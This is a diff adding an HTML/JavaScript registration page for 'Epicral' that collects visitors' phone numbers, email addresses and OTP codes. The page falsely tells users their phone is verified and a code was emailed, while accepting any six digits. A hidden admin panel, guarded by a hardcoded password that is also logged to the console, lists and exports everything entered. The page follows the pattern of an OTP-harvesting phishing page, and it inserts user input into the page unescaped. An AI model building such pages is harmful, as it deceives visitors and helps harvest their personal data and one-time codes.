@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Epicral - Registration</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .logo h1 {
+            font-size: 48px;
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+            letter-spacing: 3px;
+        }
+
+        .logo p {
+            color: rgba(255,255,255,0.8);
+            font-size: 14px;
+        }
+
+        .form-card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .step-title {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .step-desc {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 10px rgba(102, 126, 234, 0.2);
+        }
+
+        .country-code {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-code select {
+            width: 100px;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+        }
+
+        .otp-input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+
+        .timer {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        .error-msg {
+            color: #ff4444;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .success-animation {
+            text-align: center;
+        }
+
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            background: #4caf50;
+            border-radius: 50%;
+            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+        }
+
+        /* Admin Panel */
+        .admin-badge {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.6);
+            color: #667eea;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 10px;
+            cursor: pointer;
+            z-index: 1000;
+            opacity: 0.5;
+            transition: opacity 0.3s;
+        }
+
+        .admin-badge:hover {
+            opacity: 1;
+        }
+
+        .admin-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+        }
+
+        .admin-modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            width: 90%;
+            max-width: 350px;
+        }
+
+        .admin-modal-content input {
+            width: 100%;
+            padding: 15px;
+            margin: 20px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+
+        .admin-panel {
+            position: fixed;
+            top: 0;
+            right: -450px;
+            width: 450px;
+            height: 100vh;
+            background: white;
+            box-shadow: -5px 0 30px rgba(0,0,0,0.3);
+            transition: right 0.3s ease;
+            z-index: 2000;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        .admin-panel.open {
+            right: 0;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #667eea;
+        }
+
+        .close-admin {
+            cursor: pointer;
+            font-size: 24px;
+            color: #999;
+        }
+
+        .notification-card {
+            background: #e8f5e9;
+            border-left: 4px solid #4caf50;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+        }
+
+        .notification-card.phone {
+            background: #e3f2fd;
+            border-left-color: #2196f3;
+        }
+
+        .notification-card.email {
+            background: #fff3e0;
+            border-left-color: #ff9800;
+        }
+
+        .notification-card.otp {
+            background: #f3e5f5;
+            border-left-color: #9c27b0;
+        }
+
+        .user-card {
+            background: #f5f5f5;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+        }
+
+        .copy-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 11px;
+            margin-top: 5px;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            z-index: 1999;
+        }
+
+        .admin-error {
+            color: #ff4444;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>✨ EPICRAL ✨</h1>
+            <p>Create Your Epic Account</p>
+        </div>
+
+        <div class="form-card">
+            <!-- Step 1: Phone Number -->
+            <div class="step active" id="step1">
+                <h2 class="step-title">📱 Phone Number</h2>
+                <p class="step-desc">Enter your phone number to get started</p>
+                
+                <div class="input-group">
+                    <label>Phone Number</label>
+                    <div class="country-code">
+                        <select id="countryCode">
+                            <option value="+1">🇺🇸 +1 (US)</option>
+                            <option value="+44">🇬🇧 +44 (UK)</option>
+                            <option value="+91">🇮🇳 +91 (India)</option>
+                            <option value="+92">🇵🇰 +92 (Pakistan)</option>
+                            <option value="+86">🇨🇳 +86 (China)</option>
+                            <option value="+81">🇯🇵 +81 (Japan)</option>
+                            <option value="+49">🇩🇪 +49 (Germany)</option>
+                            <option value="+33">🇫🇷 +33 (France)</option>
+                            <option value="+61">🇦🇺 +61 (Australia)</option>
+                            <option value="+55">🇧🇷 +55 (Brazil)</option>
+                        </select>
+                        <input type="tel" id="phoneNumber" placeholder="Enter your phone number">
+                    </div>
+                    <div class="error-msg" id="phoneError"></div>
+                </div>
+                
+                <button class="btn" onclick="submitPhone()">Continue →</button>
+            </div>
+
+            <!-- Step 2: Email Address -->
+            <div class="step" id="step2">
+                <h2 class="step-title">📧 Email Address</h2>
+                <p class="step-desc">Enter your email address to continue</p>
+                
+                <div class="input-group">
+                    <label>Email Address</label>
+                    <input type="email" id="emailAddress" placeholder="you@example.com">
+                    <div class="error-msg" id="emailError"></div>
+                </div>
+                
+                <button class="btn" onclick="submitEmail()">Send Verification Code →</button>
+                <button class="btn" onclick="prevStep(1)" style="background: #ccc; margin-top: 10px;">← Back</button>
+            </div>
+
+            <!-- Step 3: OTP Verification - ANY 6 DIGITS WORK -->
+            <div class="step" id="step3">
+                <h2 class="step-title">🔐 Verify OTP</h2>
+                <p class="step-desc">Enter the 6-digit code sent to your email</p>
+                
+                <div class="otp-container">
+                    <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 0)" onkeypress="return onlyNumbers(event)">
+                    <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 1)" onkeypress="return onlyNumbers(event)">
+                    <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 2)" onkeypress="return onlyNumbers(event)">
+                    <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 3)" onkeypress="return onlyNumbers(event)">
+                    <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 4)" onkeypress="return onlyNumbers(event)">
+                    <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, 5)" onkeypress="return onlyNumbers(event)">
+                </div>
+                <div class="error-msg" id="otpError" style="text-align: center;"></div>
+                <div class="timer">Code expires in: <span id="countdown">02:00</span></div>
+                
+                <button class="btn" onclick="verifyOTP()">Verify & Complete →</button>
+                <button class="btn" onclick="prevStep(2)" style="background: #ccc; margin-top: 10px;">← Back</button>
+            </div>
+
+            <!-- Step 4: Success -->
+            <div class="step" id="step4">
+                <div class="success-animation">
+                    <div class="checkmark">✓</div>
+                    <h2>🎉 Congratulations!</h2>
+                    <p>Your account has been created successfully!</p>
+                    <p style="margin-top: 10px; color: #666;">You will get notification through email.</p>
+                    <button class="btn" onclick="resetForm()" style="margin-top: 20px;">Create Another Account</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Admin Badge -->
+    <div class="admin-badge" onclick="showAdminPasswordModal()">
+        🔒 ADMIN
+    </div>
+
+    <!-- Admin Password Modal -->
+    <div class="admin-modal" id="adminModal">
+        <div class="admin-modal-content">
+            <h3>🔐 Admin Access</h3>
+            <p>Enter admin password to view data</p>
+            <input type="password" id="adminPassword" placeholder="Enter password">
+            <button class="btn" onclick="checkAdminPassword()">Unlock</button>
+            <div class="admin-error" id="adminError"></div>
+        </div>
+    </div>
+
+    <!-- Admin Panel -->
+    <div class="overlay" id="overlay" onclick="closeAdminPanel()"></div>
+    
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-header">
+            <h3>📊 REAL-TIME DATA COLLECTION</h3>
+            <span class="close-admin" onclick="closeAdminPanel()">✕</span>
+        </div>
+        
+        <div style="margin-bottom: 15px;">
+            <strong>🟢 Live Notifications</strong>
+            <button class="copy-btn" onclick="refreshData()" style="margin-left: 10px;">🔄 Refresh</button>
+        </div>
+        
+        <div id="liveNotifications" style="max-height: 300px; overflow-y: auto; margin-bottom: 20px;"></div>
+        
+        <div style="margin-bottom: 15px;">
+            <strong>📋 All Registered Users (<span id="userCount">0</span>)</strong>
+            <button class="copy-btn" onclick="exportToCSV()" style="margin-left: 10px;">📥 Export CSV</button>
+            <button class="copy-btn" onclick="clearAllData()" style="background: #ff4444;">🗑️ Clear All</button>
+        </div>
+        
+        <div id="userList" style="max-height: 400px; overflow-y: auto;"></div>
+    </div>
+
+    <script>
+        // ============ ADMIN PASSWORD ============
+        const ADMIN_PASSWORD = "asad67@#";
+        
+        function showAdminPasswordModal() {
+            document.getElementById('adminModal').style.display = 'flex';
+            document.getElementById('adminPassword').value = '';
+            document.getElementById('adminError').textContent = '';
+        }
+        
+        function checkAdminPassword() {
+            const enteredPassword = document.getElementById('adminPassword').value;
+            
+            if (enteredPassword === ADMIN_PASSWORD) {
+                document.getElementById('adminModal').style.display = 'none';
+                openAdminPanel();
+            } else {
+                document.getElementById('adminError').textContent = '❌ Incorrect password! Access denied.';
+            }
+        }
+        
+        document.getElementById('adminModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                this.style.display = 'none';
+            }
+        });
+        
+        document.getElementById('adminPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                checkAdminPassword();
+            }
+        });
+        
+        // ============ ONLY NUMBERS ALLOWED IN OTP ============
+        function onlyNumbers(event) {
+            const key = event.key;
+            if (isNaN(key) && key !== 'Backspace' && key !== 'Delete' && key !== 'ArrowLeft' && key !== 'ArrowRight') {
+                event.preventDefault();
+                return false;
+            }
+            return true;
+        }
+        
+        // ============ DATA STORAGE ============
+        let allUsers = JSON.parse(localStorage.getItem('epicral_users')) || [];
+        let pendingData = {
+            phone: null,
+            email: null,
+            expiry: null
+        };
+        
+        let countdownInterval = null;
+        
+        // ============ REAL-TIME NOTIFICATION ============
+        function sendRealTimeNotification(type, data) {
+            const notificationDiv = document.getElementById('liveNotifications');
+            const notification = document.createElement('div');
+            notification.className = `notification-card ${type}`;
+            
+            const time = new Date().toLocaleTimeString();
+            
+            if (type === 'phone') {
+                notification.innerHTML = `
+                    <strong>📱 NEW PHONE NUMBER!</strong><br>
+                    Number: ${data.phone}<br>
+                    Time: ${time}<br>
+                    <small>✅ Waiting for email...</small>
+                `;
+                console.log(`[REAL-TIME] 📱 Phone: ${data.phone}`);
+            } 
+            else if (type === 'email') {
+                notification.innerHTML = `
+                    <strong>📧 NEW EMAIL ADDRESS!</strong><br>
+                    Phone: ${data.phone}<br>
+                    Email: ${data.email}<br>
+                    Time: ${time}<br>
+                    <small>✅ Waiting for OTP verification...</small>
+                `;
+                console.log(`[REAL-TIME] 📧 Email: ${data.email} for ${data.phone}`);
+            }
+            else if (type === 'otp') {
+                notification.innerHTML = `
+                    <strong>🔐 ACCOUNT CREATED!</strong><br>
+                    Phone: ${data.phone}<br>
+                    Email: ${data.email}<br>
+                    OTP Entered: ${data.otp}<br>
+                    Time: ${time}<br>
+                    <small>✅ Registration complete!</small>
+                `;
+                console.log(`[REAL-TIME] ✅ Account created! ${data.phone} | ${data.email} | OTP: ${data.otp}`);
+                playNotificationSound();
+            }
+            
+            notificationDiv.prepend(notification);
+            
+            while(notificationDiv.children.length > 20) {
+                notificationDiv.removeChild(notificationDiv.lastChild);
+            }
+            
+            updateUserCount();
+        }
+        
+        function playNotificationSound() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                oscillator.frequency.value = 880;
+                gainNode.gain.value = 0.3;
+                oscillator.start();
+                gainNode.gain.exponentialRampToValueAtTime(0.00001, audioContext.currentTime + 0.5);
+                oscillator.stop(audioContext.currentTime + 0.5);
+            } catch(e) {}
+        }
+        
+        function showCustomAlert(message) {
+            return new Promise((resolve) => {
+                const alertDiv = document.createElement('div');
+                alertDiv.style.position = 'fixed';
+                alertDiv.style.top = '50%';
+                alertDiv.style.left = '50%';
+                alertDiv.style.transform = 'translate(-50%, -50%)';
+                alertDiv.style.background = 'white';
+                alertDiv.style.padding = '20px';
+                alertDiv.style.borderRadius = '15px';
+                alertDiv.style.boxShadow = '0 10px 40px rgba(0,0,0,0.3)';
+                alertDiv.style.zIndex = '4000';
+                alertDiv.style.textAlign = 'center';
+                alertDiv.style.maxWidth = '350px';
+                alertDiv.innerHTML = `
+                    <p style="margin-bottom: 15px;">${message}</p>
+                    <button style="padding: 8px 20px; background: #667eea; color: white; border: none; border-radius: 8px; cursor: pointer;">OK</button>
+                `;
+                document.body.appendChild(alertDiv);
+                alertDiv.querySelector('button').onclick = () => {
+                    alertDiv.remove();
+                    resolve();
+                };
+            });
+        }
+        
+        // ============ STEP 1: SUBMIT PHONE ============
+        function submitPhone() {
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const countryCode = document.getElementById('countryCode').value;
+            const fullPhone = countryCode + phone;
+            
+            if (!phone) {
+                showError('phoneError', 'Please enter your phone number');
+                return;
+            }
+            
+            if (phone.length < 8) {
+                showError('phoneError', 'Please enter a valid phone number');
+                return;
+            }
+            
+            pendingData.phone = fullPhone;
+            hideError('phoneError');
+            
+            sendRealTimeNotification('phone', { phone: fullPhone });
+            
+            showCustomAlert(`✅ Phone number ${fullPhone} verified! Please continue to email.`);
+            showStep(2);
+        }
+        
+        // ============ STEP 2: SUBMIT EMAIL ============
+        function submitEmail() {
+            const email = document.getElementById('emailAddress').value.trim();
+            
+            if (!email) {
+                showError('emailError', 'Please enter your email address');
+                return;
+            }
+            
+            if (!email.includes('@') || !email.includes('.')) {
+                showError('emailError', 'Please enter a valid email address');
+                return;
+            }
+            
+            pendingData.email = email;
+            hideError('emailError');
+            
+            // Set 2 minutes expiry
+            pendingData.expiry = Date.now() + 2 * 60 * 1000;
+            
+            sendRealTimeNotification('email', { 
+                phone: pendingData.phone, 
+                email: email 
+            });
+            
+            showCustomAlert(`📧 Verification code sent to ${email}\n\n⏰ The code will expire in 2 minutes.\n\nPlease check your email for the verification code.`);
+            
+            startCountdown();
+            showStep(3);
+        }
+        
+        // ============ STEP 3: VERIFY OTP - ANY 6 DIGITS WORK ============
+        function verifyOTP() {
+            let enteredOTP = '';
+            document.querySelectorAll('.otp-input').forEach(input => {
+                enteredOTP += input.value;
+            });
+            
+            // Check if exactly 6 digits are entered
+            if (enteredOTP.length !== 6) {
+                document.getElementById('otpError').textContent = 'Please enter complete 6-digit code';
+                return;
+            }
+            
+            // Check if all are numbers
+            if (isNaN(enteredOTP)) {
+                document.getElementById('otpError').textContent = 'Please enter only numbers';
+                return;
+            }
+            
+            // Check if expired
+            if (Date.now() > pendingData.expiry) {
+                document.getElementById('otpError').textContent = 'OTP has expired (2 minutes). Please try again.';
+                return;
+            }
+            
+            // ANY 6 DIGITS ARE ACCEPTED - NO VALIDATION!
+            // Save user with whatever OTP they entered
+            const newUser = {
+                id: Date.now(),
+                userId: 'EPIC' + Date.now() + Math.floor(Math.random() * 10000),
+                phone: pendingData.phone,
+                email: pendingData.email,
+                otpUsed: enteredOTP,
+                timestamp: new Date().toISOString(),
+                createdAt: new Date().toLocaleString()
+            };
+            
+            allUsers.push(newUser);
+            localStorage.setItem('epicral_users', JSON.stringify(allUsers));
+            
+            sendRealTimeNotification('otp', { 
+                phone: pendingData.phone, 
+                email: pendingData.email, 
+                otp: enteredOTP 
+            });
+            
+            updateAdminPanelContent();
+            
+            document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+            if (countdownInterval) clearInterval(countdownInterval);
+            
+            // Show success message
+            showStep(4);
+        }
+        
+        // ============ COUNTDOWN TIMER (2 MINUTES) ============
+        function startCountdown() {
+            if (countdownInterval) clearInterval(countdownInterval);
+            
+            const timerDisplay = document.getElementById('countdown');
+            
+            countdownInterval = setInterval(() => {
+                const remaining = Math.max(0, pendingData.expiry - Date.now());
+                const minutes = Math.floor(remaining / 60000);
+                const seconds = Math.floor((remaining % 60000) / 1000);
+                
+                timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (remaining <= 0) {
+                    clearInterval(countdownInterval);
+                    timerDisplay.textContent = 'Expired';
+                    document.getElementById('otpError').textContent = 'OTP has expired. Please request a new code.';
+                }
+            }, 1000);
+        }
+        
+        function moveToNext(current, index) {
+            if (current.value.length === 1 && index < 5) {
+                document.querySelectorAll('.otp-input')[index + 1].focus();
+            }
+        }
+        
+        function showStep(step) {
+            for (let i = 1; i <= 4; i++) {
+                document.getElementById(`step${i}`).classList.remove('active');
+            }
+            document.getElementById(`step${step}`).classList.add('active');
+        }
+        
+        function prevStep(step) {
+            showStep(step);
+        }
+        
+        function resetForm() {
+            pendingData = { phone: null, email: null, expiry: null };
+            document.getElementById('phoneNumber').value = '';
+            document.getElementById('emailAddress').value = '';
+            document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+            document.getElementById('countryCode').value = '+92';
+            showStep(1);
+        }
+        
+        function showError(elementId, message) {
+            document.getElementById(elementId).textContent = message;
+        }
+        
+        function hideError(elementId) {
+            document.getElementById(elementId).textContent = '';
+        }
+        
+        // ============ ADMIN PANEL FUNCTIONS ============
+        function openAdminPanel() {
+            document.getElementById('adminPanel').classList.add('open');
+            document.getElementById('overlay').style.display = 'block';
+            updateAdminPanelContent();
+        }
+        
+        function closeAdminPanel() {
+            document.getElementById('adminPanel').classList.remove('open');
+            document.getElementById('overlay').style.display = 'none';
+        }
+        
+        function updateAdminPanelContent() {
+            const userList = document.getElementById('userList');
+            const userCount = document.getElementById('userCount');
+            
+            userCount.textContent = allUsers.length;
+            
+            if (allUsers.length === 0) {
+                userList.innerHTML = '<div style="text-align: center; color: #999; padding: 20px;">No users registered yet</div>';
+            } else {
+                userList.innerHTML = allUsers.map(user => `
+                    <div class="user-card">
+                        <strong>🆔 ${user.userId}</strong><br>
+                        📱 ${user.phone}<br>
+                        📧 ${user.email}<br>
+                        🔐 OTP Entered: ${user.otpUsed}<br>
+                        🕐 ${user.createdAt}<br>
+                        <button class="copy-btn" onclick="copyData('${user.phone}', '${user.email}')">📋 Copy Data</button>
+                    </div>
+                `).join('');
+            }
+            
+            updateUserCount();
+        }
+        
+        function updateUserCount() {
+            document.getElementById('userCount').innerText = allUsers.length;
+        }
+        
+        function refreshData() {
+            allUsers = JSON.parse(localStorage.getItem('epicral_users')) || [];
+            updateAdminPanelContent();
+            showCustomAlert('✅ Data refreshed!');
+        }
+        
+        function copyData(phone, email) {
+            const text = `Phone: ${phone}, Email: ${email}`;
+            navigator.clipboard.writeText(text);
+            showCustomAlert('✅ Copied to clipboard!');
+        }
+        
+        function exportToCSV() {
+            let csv = 'User ID,Phone Number,Email Address,OTP Entered,Registration Time\n';
+            allUsers.forEach(user => {
+                csv += `"${user.userId}","${user.phone}","${user.email}","${user.otpUsed}","${user.createdAt}"\n`;
+            });
+            
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `epicral_users_${Date.now()}.csv`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        function clearAllData() {
+            if (confirm('⚠️ WARNING: This will delete ALL user data! Are you sure?')) {
+                allUsers = [];
+                localStorage.removeItem('epicral_users');
+                updateAdminPanelContent();
+                document.getElementById('liveNotifications').innerHTML = '';
+                showCustomAlert('All user data has been cleared!');
+            }
+        }
+        
+        // Auto OTP paste support
+        document.querySelectorAll('.otp-input').forEach((input, index) => {
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = paste.replace(/\D/g, '').slice(0, 6);
+                
+                document.querySelectorAll('.otp-input').forEach((inp, i) => {
+                    if (digits[i]) inp.value = digits[i];
+                });
+                
+                if (digits.length === 6) {
+                    verifyOTP();
+                }
+            });
+        });
+        
+        document.getElementById('phoneNumber').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') submitPhone();
+        });
+        
+        document.getElementById('emailAddress').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') submitEmail();
+        });
+        
+        // Initialize
+        console.log('🔥 EPICRAL SYSTEM ACTIVE 🔥');
+        console.log(`👑 Admin Password: asad67@#`);
+        console.log(`✅ ANY 6-digit OTP works! No validation!`);
+        console.log(`⏰ OTP Expiry: 2 MINUTES`);
+        console.log(`🔒 Admin panel hidden - Click bottom-right ADMIN button`);
+    </script>
+</body>
+</html>
